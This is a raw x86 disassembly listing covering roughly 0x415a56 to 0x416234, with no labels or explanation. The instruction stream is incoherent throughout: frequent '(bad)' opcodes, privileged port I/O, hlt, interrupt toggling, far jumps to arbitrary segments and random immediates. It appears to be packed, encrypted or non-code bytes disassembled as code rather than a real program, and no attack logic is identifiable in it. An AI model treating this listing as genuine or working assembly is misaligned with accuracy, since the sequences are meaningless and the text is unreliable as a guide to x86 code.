  415a56:	xor    DWORD PTR [eax+edx*8+0x28d782f8],esi
  415a5d:	or     esi,DWORD PTR [ecx+0x33]
  415a60:	out    dx,eax
  415a61:	addr16 mov dh,0x79
  415a64:	sub    dl,ah
  415a66:	pop    ecx
  415a67:	stos   DWORD PTR es:[edi],eax
  415a68:	jge    0x415aba
  415a6a:	imul   ebx,DWORD PTR [ebx-0x5d],0x58
  415a6e:	add    al,0xea
  415a70:	pop    ds
  415a71:	out    0x50,eax
  415a73:	or     ah,BYTE PTR [ebx-0x5e82666b]
  415a79:	and    BYTE PTR [ecx+0xa],cl
  415a7c:	div    BYTE PTR [edx+edx*4+0x2a26cb91]
  415a83:	sbb    DWORD PTR [ecx-0x34bc0449],ebx
  415a89:	iret   
  415a8a:	fld    QWORD PTR [ecx-0xd]
  415a8d:	pop    ds
  415a8e:	(bad)  
  415a8f:	jl     0x415ae0
  415a91:	xchg   ebp,eax
  415a92:	adc    esp,DWORD PTR [ecx+0x1f2a31ee]
  415a98:	add    BYTE PTR [esi+edi*4],dh
  415a9b:	mov    bh,0x24
  415a9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415a9e:	xchg   ecx,eax
  415a9f:	sbb    eax,0xba629d8d
  415aa4:	pop    DWORD PTR [esp+eax*1+0x433261ef]
  415aab:	jg     0x415b2a
  415aad:	adc    bl,BYTE PTR [ebp+0x3f7fc658]
  415ab3:	mov    es,WORD PTR [ecx*2+0x6017b089]
  415aba:	push   ecx
  415abb:	pop    es
  415abc:	ins    BYTE PTR es:[edi],dx
  415abd:	mov    al,0xf
  415abf:	xchg   edi,eax
  415ac0:	dec    ebx
  415ac1:	push   edi
  415ac2:	outs   dx,BYTE PTR ds:[esi]
  415ac3:	xchg   DWORD PTR [ebx-0x48c37f63],esi
  415ac9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415aca:	push   ebx
  415acb:	rol    BYTE PTR [ebx-0x29666f90],cl
  415ad1:	lahf   
  415ad2:	ja     0x415ae0
  415ad4:	clc    
  415ad5:	sahf   
  415ad6:	out    dx,eax
  415ad7:	jbe    0x415a6c
  415ad9:	mov    ds:0x6517d8fd,al
  415ade:	sbb    eax,0xb66e9954
  415ae3:	imul   esi,ebp,0xd349005d
  415ae9:	mov    ds:0xb7e9e815,eax
  415aee:	mov    ebp,DWORD PTR [edi-0x41]
  415af1:	out    dx,al
  415af2:	push   ecx
  415af3:	frstor [edi-0x748916f6]
  415af9:	(bad)  
  415afa:	scas   al,BYTE PTR es:[edi]
  415afb:	icebp  
  415afc:	arpl   WORD PTR [ebx-0x16],si
  415aff:	xor    ch,bl
  415b01:	and    eax,0xcde6e35a
  415b06:	shl    esp,1
  415b08:	dec    esi
  415b09:	pop    ds
  415b0a:	mov    bh,BYTE PTR [ecx]
  415b0c:	and    DWORD PTR [esi-0x157f3d92],0xffffffd7
  415b13:	jns    0x415b47
  415b15:	(bad)  
  415b16:	xor    bh,dh
  415b18:	fld    DWORD PTR ds:0x906e1e09
  415b1e:	pop    ss
  415b1f:	sar    DWORD PTR [edi],0xd5
  415b22:	inc    edx
  415b23:	pop    ebp
  415b24:	sti    
  415b25:	xchg   edx,eax
  415b26:	xchg   edi,eax
  415b27:	paddsw mm2,QWORD PTR [ebp-0x24]
  415b2b:	mov    edx,0x49c31713
  415b30:	fld    st(2)
  415b32:	xchg   esi,ebp
  415b34:	dec    edi
  415b35:	dec    edi
  415b36:	xlat   BYTE PTR ds:[ebx]
  415b37:	jmp    0x1fa7:0xd19efbf4
  415b3e:	stos   BYTE PTR es:[edi],al
  415b3f:	dec    ecx
  415b40:	sbb    esp,edx
  415b42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415b43:	inc    DWORD PTR [edx*2-0x73ae6207]
  415b4a:	mov    dl,0x80
  415b4c:	and    al,BYTE PTR [edi+0x50542423]
  415b52:	shr    DWORD PTR [ebx+0x739179f5],cl
  415b58:	push   ebp
  415b59:	ret    
  415b5a:	xchg   ecx,eax
  415b5b:	xchg   ebx,eax
  415b5c:	jmp    0x9eec:0x5a033cfc
  415b63:	push   0xaa9b658d
  415b68:	sub    al,0xb9
  415b6a:	in     eax,0xff
  415b6c:	shl    DWORD PTR [ebp-0x3bbbe380],cl
  415b72:	sbb    bl,ch
  415b74:	das    
  415b75:	frstor [ecx+0x1f]
  415b78:	call   0xfc2fd55e
  415b7d:	add    bl,dl
  415b7f:	mov    ecx,0x48ce1f
  415b84:	mov    ebx,0x493ebe79
  415b89:	leave  
  415b8a:	aas    
  415b8b:	pop    esi
  415b8c:	(bad)  
  415b8d:	(bad)  
  415b8e:	sti    
  415b8f:	cwde   
  415b90:	fld    DWORD PTR [edi+0x261e8e71]
  415b96:	inc    ecx
  415b97:	xchg   edx,eax
  415b98:	dec    esi
  415b99:	imul   DWORD PTR [eax+0x3b]
  415b9c:	mov    ah,0xf7
  415b9e:	in     al,0x14
  415ba0:	xor    DWORD PTR [ecx+0x15364b5a],ebx
  415ba6:	mov    esp,0x845f325b
  415bab:	dec    ebp
  415bac:	daa    
  415bad:	iret   
  415bae:	and    dh,BYTE PTR [edx]
  415bb0:	clc    
  415bb1:	xor    BYTE PTR [ebp+0x6b],cl
  415bb4:	or     BYTE PTR [edx+0x5d],0xc5
  415bb8:	add    eax,0x1573921
  415bbd:	gs cmp dh,0x8d
  415bc1:	mov    dh,0x30
  415bc3:	inc    esp
  415bc4:	(bad)  
  415bc5:	(bad)  
  415bc6:	(bad)  
  415bc7:	mov    cl,0x26
  415bc9:	idiv   BYTE PTR [edi-0x50abd033]
  415bcf:	daa    
  415bd0:	pop    esi
  415bd1:	hlt    
  415bd2:	mov    DWORD PTR [edx],edx
  415bd4:	push   ss
  415bd5:	mov    eax,ecx
  415bd7:	xchg   edi,eax
  415bd8:	pop    edi
  415bd9:	push   ss
  415bda:	jae    0x415b62
  415bdc:	(bad)  
  415bdd:	xor    al,cl
  415bdf:	xchg   ebp,eax
  415be0:	lahf   
  415be1:	ds mov edi,0x9ef54cf4
  415be7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415be8:	fcomp  DWORD PTR [edx+0x2f]
  415beb:	mov    ch,0x69
  415bed:	xor    DWORD PTR [edx+0x27],0xffffffca
  415bf1:	rcr    BYTE PTR [edi],cl
  415bf3:	xchg   esp,eax
  415bf4:	loop   0x415c62
  415bf6:	mov    esi,0x79304b5b
  415bfb:	mov    cl,0x93
  415bfd:	and    DWORD PTR [ebx-0x242aac80],ebx
  415c03:	mov    esp,0x5897eddb
  415c08:	(bad)  
  415c09:	push   edx
  415c0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415c0b:	add    ah,cl
  415c0d:	out    dx,al
  415c0e:	inc    edi
  415c0f:	js     0x415c90
  415c11:	inc    esp
  415c12:	cmc    
  415c13:	xchg   ecx,eax
  415c14:	outs   dx,BYTE PTR ds:[esi]
  415c15:	ja     0x415c04
  415c17:	clc    
  415c18:	test   al,0xf2
  415c1a:	cmp    BYTE PTR [esi+esi*1-0x14c9c8b6],bh
  415c21:	jmp    0x2c0819ad
  415c26:	jmp    0xf486c15e
  415c2b:	dec    eax
  415c2c:	jecxz  0x415c6f
  415c2e:	test   al,bl
  415c30:	and    BYTE PTR [edx-0x3190dbd4],cl
  415c36:	popa   
  415c37:	push   ecx
  415c38:	mov    gs:0xffa42e50,al
  415c3e:	or     al,0xb4
  415c40:	in     al,dx
  415c41:	jp     0x415cbe
  415c43:	hlt    
  415c44:	addr16 jmp 0x3178:0x5291
  415c4b:	sbb    eax,DWORD PTR [esp+0x3772e37b]
  415c52:	inc    ebp
  415c53:	add    al,0xfc
  415c55:	jp     0x415c7b
  415c57:	sub    eax,0x3fdd0dc7
  415c5c:	aad    0xfe
  415c5e:	loope  0x415cd0
  415c60:	pop    edx
  415c61:	hlt    
  415c62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c63:	retf   0x609d
  415c66:	es inc ecx
  415c68:	adc    ecx,edx
  415c6a:	xchg   edi,eax
  415c6b:	jp     0x415cda
  415c6d:	ins    DWORD PTR es:[edi],dx
  415c6e:	lock mov al,0x69
  415c71:	push   0xdc59ef6c
  415c76:	add    eax,0x36e31e59
  415c7b:	mov    dh,0xcd
  415c7d:	and    al,dl
  415c7f:	inc    ebx
  415c80:	push   cs
  415c81:	jo     0x415c83
  415c83:	push   ebx
  415c84:	mov    ?,eax
  415c86:	xchg   edx,eax
  415c87:	xchg   DWORD PTR [edx+esi*2-0x3c25865c],ecx
  415c8e:	xchg   ebp,eax
  415c8f:	xchg   esp,eax
  415c90:	xchg   al,ah
  415c92:	and    DWORD PTR [edi+eax*4],0xffffffcd
  415c96:	iret   
  415c97:	jo     0x415c1e
  415c99:	test   BYTE PTR [edx],bh
  415c9b:	imul   ebx,DWORD PTR [ecx+0x3c],0xffffffe0
  415c9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ca0:	lods   al,BYTE PTR ds:[esi]
  415ca1:	mov    edi,0x8fd89d95
  415ca6:	or     DWORD PTR [edi+0x75],ecx
  415ca9:	mul    esi
  415cab:	fdivr  DWORD PTR [eax-0x7753a123]
  415cb1:	test   DWORD PTR [ebx+0x4e026a71],0x7c54228a
  415cbb:	mov    DWORD PTR [ebx-0x6d],ebp
  415cbe:	push   cs
  415cbf:	fs out dx,al
  415cc1:	test   BYTE PTR [edx+0x28],0x7
  415cc5:	test   BYTE PTR [edi+0x5879c633],bh
  415ccb:	setnp  BYTE PTR [ebp-0x4913b31e]
  415cd2:	or     al,0x3c
  415cd4:	xor    DWORD PTR [edi+0x48],0xffffffa6
  415cd8:	clc    
  415cd9:	pusha  
  415cda:	je     0x415cf4
  415cdc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415cdd:	jnp    0x415d41
  415cdf:	mov    ds:0x138ea2c1,eax
  415ce4:	mov    ch,0x13
  415ce6:	repnz mov ch,0xea
  415ce9:	pop    ds
  415cea:	test   eax,0xd27b3dba
  415cef:	ret    0x5db0
  415cf2:	mov    BYTE PTR [edx-0x2],bh
  415cf5:	lahf   
  415cf6:	and    al,0x91
  415cf8:	sub    al,0xc1
  415cfa:	mov    ch,0x57
  415cfc:	jmp    0x88535a85
  415d01:	scas   al,BYTE PTR es:[edi]
  415d02:	add    al,BYTE PTR [edi-0x3e591a2]
  415d08:	mov    DWORD PTR [edx-0x1b76c2c8],edi
  415d0e:	xor    eax,eax
  415d10:	adc    dl,BYTE PTR [ebp+ebx*1+0x46731ca2]
  415d17:	in     eax,dx
  415d18:	cdq    
  415d19:	rcr    DWORD PTR [edi+eax*8],0x3c
  415d1d:	fist   WORD PTR [eax]
  415d1f:	mov    DWORD PTR [ebp+0x7c],edi
  415d22:	iret   
  415d23:	cmp    edx,DWORD PTR [ebx-0x1224188e]
  415d29:	cmp    edi,esi
  415d2b:	loopne 0x415cd9
  415d2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d2e:	sti    
  415d2f:	mov    ebp,0xd935f370
  415d34:	das    
  415d35:	sbb    BYTE PTR [ebx],0xc2
  415d38:	imul   ebx,ebx,0x4d
  415d3b:	icebp  
  415d3c:	inc    edi
  415d3d:	ja     0x415d13
  415d3f:	ror    BYTE PTR [edi-0x125af8da],0x9f
  415d46:	and    ebx,DWORD PTR [ecx]
  415d48:	ret    
  415d49:	cs ret 0x647e
  415d4d:	test   al,0x23
  415d4f:	and    ch,dl
  415d51:	dec    ecx
  415d52:	jb     0x415cde
  415d54:	xchg   ebp,eax
  415d55:	cli    
  415d56:	jecxz  0x415d78
  415d58:	les    ax,DWORD PTR [eax+0x7c]
  415d5c:	pop    ecx
  415d5d:	aaa    
  415d5e:	jns    0x415d05
  415d60:	call   0x7ac7:0x8a010f84
  415d67:	pop    ebp
  415d68:	fld    QWORD PTR [edi+ebp*2]
  415d6b:	dec    edx
  415d6c:	scas   al,BYTE PTR es:[edi]
  415d6d:	add    BYTE PTR [edi],dl
  415d6f:	shr    esp,0x97
  415d72:	fsub   QWORD PTR [ecx]
  415d74:	add    dl,BYTE PTR [ecx]
  415d76:	xchg   ebp,eax
  415d77:	(bad)  
  415d78:	out    dx,al
  415d79:	fscale 
  415d7b:	jnp    0x415d92
  415d7d:	jbe    0x415d3c
  415d7f:	fistp  QWORD PTR [esi-0x4c]
  415d82:	push   0x12f3207a
  415d87:	and    BYTE PTR [ebp-0x46],bh
  415d8a:	leave  
  415d8b:	out    dx,eax
  415d8c:	and    DWORD PTR [ebp-0x64252b4],edx
  415d92:	push   edx
  415d93:	push   0xb5f07dd6
  415d98:	and    ebx,DWORD PTR [ebp+edx*4-0x65fc2251]
  415d9f:	jno    0x415d54
  415da1:	lods   eax,DWORD PTR ds:[esi]
  415da2:	sub    al,0x6f
  415da4:	fist   DWORD PTR [edi+0x1d]
  415da7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415da8:	xchg   BYTE PTR [esi],bl
  415daa:	mov    al,0x49
  415dac:	je     0x415dc1
  415dae:	jns    0x415d7d
  415db0:	cmp    eax,0xec86f012
  415db5:	pop    es
  415db6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415db7:	mov    al,BYTE PTR [ecx+0x5e]
  415dba:	popf   
  415dbb:	les    eax,FWORD PTR [ecx-0x12ec08a8]
  415dc1:	stos   BYTE PTR es:[edi],al
  415dc2:	mov    ebp,0xafc7ed6e
  415dc7:	xchg   esp,eax
  415dc8:	(bad)  [edx+0x7ce168ad]
  415dce:	mov    dh,0x17
  415dd0:	sub    DWORD PTR [esi-0x4b32b6f3],0xffffffca
  415dd7:	outs   dx,DWORD PTR ds:[esi]
  415dd8:	dec    esi
  415dd9:	xor    BYTE PTR [edi+eax*1+0x3243eb0e],bl
  415de0:	test   al,0x9b
  415de2:	jge    0x415d6d
  415de4:	sti    
  415de5:	arpl   sp,si
  415de7:	xor    eax,0x31e87edc
  415dec:	pop    esp
  415ded:	mov    bl,0xd1
  415def:	test   BYTE PTR [esi-0x1e80a8d3],bh
  415df5:	data16 outs dx,BYTE PTR ds:[esi]
  415df7:	int    0xe4
  415df9:	loope  0x415d7e
  415dfb:	fcmovbe st,st(2)
  415dfd:	xor    al,0x2b
  415dff:	data16 stos BYTE PTR es:[edi],al
  415e01:	call   FWORD PTR [esi]
  415e03:	imul   esi,eax,0xffffffa4
  415e06:	mov    ebp,es
  415e08:	test   al,0xb5
  415e0a:	cmp    dl,BYTE PTR [bx+di]
  415e0d:	(bad)  
  415e0e:	dec    BYTE PTR [ecx+0x41]
  415e11:	push   edx
  415e12:	out    dx,al
  415e13:	mov    ch,0xe7
  415e15:	cmp    edi,DWORD PTR [ebp+0x745ca8e3]
  415e1b:	hlt    
  415e1c:	ficom  WORD PTR ds:0x780d3275
  415e22:	sahf   
  415e23:	lods   al,BYTE PTR ds:[esi]
  415e24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e25:	sti    
  415e26:	cmp    eax,0x84fb6084
  415e2b:	cmc    
  415e2c:	adc    BYTE PTR [eax+0x324cacf8],0x94
  415e33:	sbb    ebx,DWORD PTR [eax+0x5622a179]
  415e39:	cli    
  415e3a:	aad    0x13
  415e3c:	push   0x28
  415e3e:	stos   DWORD PTR es:[edi],eax
  415e3f:	push   ss
  415e40:	fdivr  QWORD PTR [edi-0x33]
  415e43:	je     0x415ddf
  415e45:	daa    
  415e46:	scas   eax,DWORD PTR es:[edi]
  415e47:	es call 0x360721a1
  415e4d:	adc    dl,bh
  415e4f:	xchg   ebp,eax
  415e50:	aaa    
  415e51:	xchg   esi,eax
  415e52:	(bad)  
  415e53:	popa   
  415e54:	inc    ebp
  415e55:	pop    ss
  415e56:	(bad)  
  415e58:	(bad)
  415e5c:	jae    0x415e40
  415e5e:	push   eax
  415e5f:	fs jle 0x415ebf
  415e62:	xchg   bh,dh
  415e64:	jns    0x415ecf
  415e66:	sub    al,0x95
  415e68:	jle    0x415ec8
  415e6a:	jo     0x415dfc
  415e6c:	in     eax,0xae
  415e6e:	jbe    0x415e1b
  415e70:	fst    QWORD PTR [edi]
  415e72:	enter  0xfe05,0xd2
  415e76:	or     ebp,ebx
  415e78:	cmp    BYTE PTR [ecx+0x73cf2fad],al
  415e7e:	jns    0x415e1c
  415e80:	ror    DWORD PTR [ecx-0x70],1
  415e83:	loope  0x415e7d
  415e85:	mov    ecx,DWORD PTR [esi+0xb]
  415e88:	push   0x1b
  415e8a:	stos   DWORD PTR es:[edi],eax
  415e8b:	adc    al,0xcf
  415e8d:	fwait
  415e8e:	int    0xbe
  415e90:	push   0x11
  415e92:	jbe    0x415eaf
  415e94:	jmp    0x7c3ce32a
  415e99:	in     eax,dx
  415e9a:	sar    edx,0x11
  415e9d:	inc    ebx
  415e9e:	mov    ebp,0x646928e4
  415ea3:	rcr    bl,cl
  415ea5:	add    edi,DWORD PTR [ebx-0x19]
  415ea8:	xor    eax,0xa5d3dcd0
  415ead:	pop    edi
  415eae:	mov    eax,0xd673973f
  415eb3:	mov    esp,0xe607b6d
  415eb8:	pop    ebx
  415eb9:	enter  0xfea5,0x8
  415ebd:	mov    ds:0x8e9d2403,al
  415ec2:	cmp    al,0x90
  415ec4:	dec    eax
  415ec5:	jo     0x415ea5
  415ec7:	pop    esp
  415ec8:	sbb    eax,0xa5e88157
  415ecd:	xor    bh,BYTE PTR [eax-0x769595a6]
  415ed3:	aam    0xba
  415ed5:	push   cs
  415ed6:	mov    ds:0x8b686e2d,eax
  415edb:	stc    
  415edc:	in     al,0xad
  415ede:	xchg   edx,eax
  415edf:	neg    ecx
  415ee1:	clc    
  415ee2:	jo     0x415f15
  415ee4:	cmp    eax,esi
  415ee6:	inc    ebx
  415ee7:	dec    ebx
  415ee8:	stc    
  415ee9:	dec    ebp
  415eea:	les    esi,FWORD PTR [ecx+0x37]
  415eed:	test   BYTE PTR [ebp-0x711530b9],bl
  415ef3:	lods   eax,DWORD PTR ds:[esi]
  415ef4:	xor    dh,BYTE PTR [eax]
  415ef6:	jmp    0x415ee0
  415ef8:	cld    
  415ef9:	xor    BYTE PTR ds:0xfa3bc8c3,bh
  415eff:	rcl    ebp,0x54
  415f02:	push   0x6cdd14b4
  415f07:	aam    0xf0
  415f09:	shl    BYTE PTR [esi],1
  415f0b:	adc    eax,0x7284d2cf
  415f10:	mov    ebp,0xe3e25df9
  415f15:	or     eax,0xef912b0b
  415f1b:	sub    al,BYTE PTR [ebp-0x502f0312]
  415f21:	fisttp QWORD PTR [ebp-0x32]
  415f24:	mov    ch,0xcf
  415f26:	xor    cl,cl
  415f28:	mov    edi,0xfd606e0
  415f2e:	push   edi
  415f2f:	out    0x17,al
  415f31:	sbb    eax,0x9b3faf35
  415f36:	xchg   ebx,eax
  415f37:	stos   BYTE PTR es:[edi],al
  415f38:	(bad)  
  415f39:	jmp    DWORD PTR [edi+ebp*2+0x10786610]
  415f40:	mov    esi,0x89037318
  415f45:	rcr    edx,1
  415f47:	cmp    ch,BYTE PTR [edx+0xf]
  415f4a:	in     eax,dx
  415f4b:	lea    edx,[ebx+ecx*2]
  415f4e:	fld    DWORD PTR ds:0x1895bdc
  415f54:	jg     0x415f85
  415f56:	xchg   esi,eax
  415f57:	mov    fs,ecx
  415f59:	(bad)  
  415f5a:	push   ecx
  415f5b:	std    
  415f5c:	pop    esp
  415f5d:	push   cs
  415f5e:	fimul  DWORD PTR [ebx]
  415f60:	outs   dx,BYTE PTR ds:[esi]
  415f61:	xor    DWORD PTR [edi],0x53d3bddb
  415f67:	repnz mov BYTE PTR [edi-0x2a95921f],bl
  415f6e:	lds    ebx,FWORD PTR [eax-0x6a]
  415f71:	mov    ds:0x846e2345,eax
  415f76:	clc    
  415f77:	iret   
  415f78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f79:	add    DWORD PTR [ebp+0x3ef5b4fa],eax
  415f7f:	lea    ebx,[ebp+0x42]
  415f82:	inc    ebx
  415f83:	arpl   WORD PTR [ebx+ecx*4-0x61],bp
  415f87:	or     BYTE PTR [ebp+0x3ab58196],al
  415f8d:	fs sbb ecx,edx
  415f90:	data16 sbb ch,BYTE PTR [ebx+0x475a4e5b]
  415f97:	(bad)  
  415f98:	ja     0x415f5f
  415f9a:	or     DWORD PTR [esi-0x74],edi
  415f9d:	leave  
  415f9e:	xor    ebp,DWORD PTR ds:0xbd115420
  415fa4:	(bad)  
  415fa5:	pop    esi
  415fa6:	jge    0x415fae
  415fa8:	ja     0x415f59
  415faa:	rcr    DWORD PTR [edi+0x13],1
  415fad:	ds inc ebp
  415faf:	repnz dec esp
  415fb1:	repnz (bad) 
  415fb4:	push   es
  415fb5:	mov    DWORD PTR [edi-0xf4cb714],eax
  415fbb:	jg     0x415f42
  415fbd:	push   0x40675545
  415fc2:	outs   dx,BYTE PTR ds:[esi]
  415fc3:	jge    0x41603b
  415fc5:	ret    
  415fc6:	in     eax,dx
  415fc7:	push   ds
  415fc8:	popa   
  415fc9:	mov    bl,0x56
  415fcb:	cmp    ebx,DWORD PTR ds:0xb695773c
  415fd1:	cmp    al,0x23
  415fd3:	leave  
  415fd4:	xchg   esi,eax
  415fd5:	pop    ecx
  415fd6:	bound  esp,QWORD PTR [ebp+0x18510895]
  415fdc:	pop    es
  415fdd:	xor    DWORD PTR [ebx+0x6c],edi
  415fe0:	inc    eax
  415fe1:	adc    al,0xae
  415fe3:	test   DWORD PTR [esi-0x64cdf4d7],0xa8d588b1
  415fed:	cmp    al,0x84
  415ff0:	clc    
  415ff1:	gs push edx
  415ff3:	sub    DWORD PTR [eax+0x2a403f52],0xbc65a654
  415ffd:	and    DWORD PTR ds:[ecx],edx
  416000:	jl     0x416053
  416002:	dec    edx
  416003:	lods   al,BYTE PTR ds:[esi]
  416004:	js     0x416042
  416006:	sbb    al,0x4e
  416008:	mov    ah,BYTE PTR [ebp-0x22]
  41600b:	mov    bh,0x47
  41600d:	(bad)  
  41600e:	cmc    
  41600f:	ins    BYTE PTR es:[edi],dx
  416010:	add    eax,0xee3aebe
  416015:	mov    edi,0x3dc92d72
  41601a:	jmp    0x41605d
  41601c:	ins    DWORD PTR es:[edi],dx
  41601d:	int3   
  41601e:	ret    0x4fc
  416021:	and    al,0x9b
  416023:	(bad)  
  416024:	pop    esp
  416025:	rol    BYTE PTR [ecx+ebx*2-0x63],0x61
  41602a:	out    dx,al
  41602b:	or     eax,eax
  41602d:	mov    eax,0x72fe8940
  416032:	push   eax
  416033:	hlt    
  416034:	fimul  DWORD PTR [esi]
  416036:	xor    al,0x5e
  416038:	xchg   ebx,eax
  416039:	iret   
  41603a:	test   BYTE PTR [edx-0x4b],ah
  41603d:	inc    esp
  41603e:	ss jl  0x416050
  416041:	adc    BYTE PTR [ebx+0x76e96c88],0xda
  416048:	sbb    al,0x67
  41604a:	shl    DWORD PTR [ecx+esi*4+0x75],cl
  41604e:	pushf  
  41604f:	jns    0x416080
  416051:	(bad)  
  416053:	mov    edi,0x94ba132b
  416058:	ret    0x30a7
  41605b:	mov    bl,0x71
  41605d:	mov    eax,ds:0x42b063fe
  416062:	sbb    DWORD PTR [ecx+0x211b186c],ecx
  416068:	xchg   edx,eax
  416069:	test   dl,dh
  41606b:	popa   
  41606c:	rol    BYTE PTR ds:0xb4d7666,cl
  416072:	or     al,BYTE PTR [eax+0x24e22390]
  416078:	mov    esp,0xa95256e0
  41607d:	and    BYTE PTR [edi+0x46],cl
  416080:	call   0x2557:0x25f943d7
  416087:	ds mov eax,0xf46e6f62
  41608d:	ds cli 
  41608f:	iret   
  416090:	mov    ah,bl
  416092:	mov    ds:0xea73fa94,al
  416097:	dec    ebx
  416098:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416099:	jns    0x4160b8
  41609b:	xchg   esp,eax
  41609c:	(bad)  
  41609d:	pop    ax
  41609f:	jae    0x4160c7
  4160a1:	pushf  
  4160a2:	div    ebp
  4160a4:	popa   
  4160a5:	or     al,0x53
  4160a7:	adc    al,0xbe
  4160a9:	jbe    0x416040
  4160ab:	cwde   
  4160ac:	(bad)  
  4160ad:	fwait
  4160ae:	arpl   WORD PTR [eax-0x73ef3645],bp
  4160b4:	add    bl,al
  4160b6:	xor    BYTE PTR [ebx+0x3cef616b],ah
  4160bc:	mov    ebp,0x63adba13
  4160c1:	push   ds
  4160c2:	dec    edx
  4160c3:	jmp    0x9cfcc078
  4160c8:	add    bh,BYTE PTR [esi]
  4160ca:	add    ebx,DWORD PTR gs:[ebp-0x58]
  4160ce:	lods   eax,DWORD PTR ds:[esi]
  4160cf:	lock imul edx,DWORD PTR [ebp+0x5c],0x6960901f
  4160d7:	and    al,BYTE PTR [ebx-0x5]
  4160da:	pushf  
  4160db:	aad    0x39
  4160dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4160de:	adc    al,0x8a
  4160e0:	(bad)  
  4160e1:	(bad)  
  4160e2:	pusha  
  4160e3:	in     al,dx
  4160e4:	test   BYTE PTR [edx-0x12],cl
  4160e7:	hlt    
  4160e8:	daa    
  4160e9:	pop    edi
  4160ea:	add    dh,BYTE PTR [edx+0xc34e486]
  4160f0:	aas    
  4160f1:	cmp    eax,0x53841785
  4160f6:	sahf   
  4160f7:	push   edx
  4160f8:	pop    esp
  4160f9:	mov    bl,0x76
  4160fb:	sbb    eax,eax
  4160fd:	sar    eax,cl
  4160ff:	adc    edi,edi
  416101:	pop    ecx
  416102:	out    0x3e,al
  416104:	xor    dl,ah
  416106:	add    ecx,DWORD PTR [ecx-0x45]
  416109:	or     eax,edi
  41610b:	idiv   BYTE PTR [eax-0x2872e386]
  416111:	xor    BYTE PTR [edi*2+0x57e14be6],bh
  416118:	mov    ds:0x4986b458,eax
  41611d:	fild   DWORD PTR [ebp-0x52]
  416120:	dec    esp
  416121:	div    bh
  416123:	pushf  
  416124:	outs   dx,DWORD PTR ds:[esi]
  416125:	fs dec ebp
  416127:	sub    cl,BYTE PTR [ebp+0x836f482]
  41612d:	mov    ah,dl
  41612f:	cli    
  416130:	mov    WORD PTR [esi+edx*1-0x44843e8],gs
  416137:	cdq    
  416138:	pop    ecx
  416139:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41613a:	sbb    edx,DWORD PTR [ebx-0x30c87ee5]
  416140:	mov    esi,0xacf0a405
  416145:	push   eax
  416146:	pop    ds
  416147:	cli    
  416148:	push   ds
  416149:	or     eax,0x95ffca9c
  41614e:	jb     0x41613f
  416150:	add    dl,BYTE PTR [ecx-0x33380a2d]
  416156:	pop    ebp
  416157:	shr    DWORD PTR [edi-0x27],cl
  41615a:	nop
  41615b:	or     eax,0xe3001cc8
  416160:	cdq    
  416161:	loopne 0x416156
  416163:	dec    BYTE PTR [esi]
  416165:	lds    eax,FWORD PTR [eax+0x1]
  416168:	pop    eax
  416169:	rcl    BYTE PTR [esi],0x12
  41616c:	and    eax,0xda0468d3
  416171:	adc    cl,BYTE PTR ds:[esi-0xd4a9edd]
  416178:	mov    edx,0x90a0e980
  41617d:	cwde   
  41617e:	push   ebx
  41617f:	add    al,0xdb
  416181:	or     esp,DWORD PTR [ebx-0x4666efbf]
  416187:	sub    ebp,esp
  416189:	and    esp,DWORD PTR [eax-0x3965de6a]
  41618f:	push   esp
  416190:	adc    edx,DWORD PTR [esi]
  416192:	dec    edx
  416193:	pop    eax
  416194:	inc    ebx
  416195:	inc    esp
  416196:	jno    0x416189
  416198:	pop    edx
  416199:	or     al,0xa0
  41619b:	sub    BYTE PTR [edi],al
  41619d:	jbe    0x4161ce
  41619f:	retf   
  4161a0:	fstp   QWORD PTR [edi]
  4161a2:	es cli 
  4161a4:	es add ah,dh
  4161a7:	add    eax,0x91a53ee8
  4161ac:	push   esp
  4161ad:	push   eax
  4161ae:	sub    DWORD PTR [ebx],esp
  4161b0:	and    al,0x41
  4161b2:	loop   0x416218
  4161b4:	jne    0x41618b
  4161b6:	adc    al,BYTE PTR [ebx+0xf]
  4161b9:	int3   
  4161ba:	sbb    DWORD PTR [edx],0x35
  4161bd:	retf   0x6982
  4161c0:	int3   
  4161c1:	sub    al,0x7f
  4161c3:	mov    cl,0x3f
  4161c5:	push   ebp
  4161c6:	out    0xce,eax
  4161c8:	mov    eax,0x9fc55d18
  4161cd:	data16 hlt 
  4161cf:	lods   eax,DWORD PTR ds:[esi]
  4161d0:	and    eax,0xd8732a5f
  4161d5:	call   0xdce9c3af
  4161da:	aas    
  4161db:	inc    esi
  4161dc:	imul   esp,DWORD PTR [eax-0x58a3acba],0xf5e1e9a0
  4161e6:	sub    edx,DWORD PTR [edx-0x60141e2c]
  4161ec:	(bad)  
  4161ed:	loopne 0x4161b6
  4161ef:	inc    edx
  4161f0:	jecxz  0x4161b2
  4161f2:	(bad)  
  4161f3:	jbe    0x4161c0
  4161f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4161f6:	test   eax,0xf5cd12c3
  4161fb:	inc    ecx
  4161fc:	or     DWORD PTR ds:0x2361f6c7,edi
  416202:	xchg   esi,eax
  416203:	in     eax,0x88
  416205:	sub    al,0xbc
  416207:	outs   dx,DWORD PTR ds:[esi]
  416208:	fcomp  QWORD PTR [ecx-0x45]
  41620b:	call   0x3f89:0x10e5dd81
  416212:	pusha  
  416213:	xor    eax,0xa1fd18ef
  416218:	push   esp
  416219:	mov    ebx,0x7d40a467
  41621e:	(bad)  [esi]
  416220:	fnclex 
  416222:	xor    ecx,DWORD PTR [edi+0xac0f4f8]
  416228:	sub    bl,bh
  41622a:	inc    edi
  41622b:	xchg   edx,eax
  41622c:	mov    DWORD PTR [ecx-0x2d830164],ebp
  416232:	jbe    0x41623e
  416234:	push   0xffffffcd
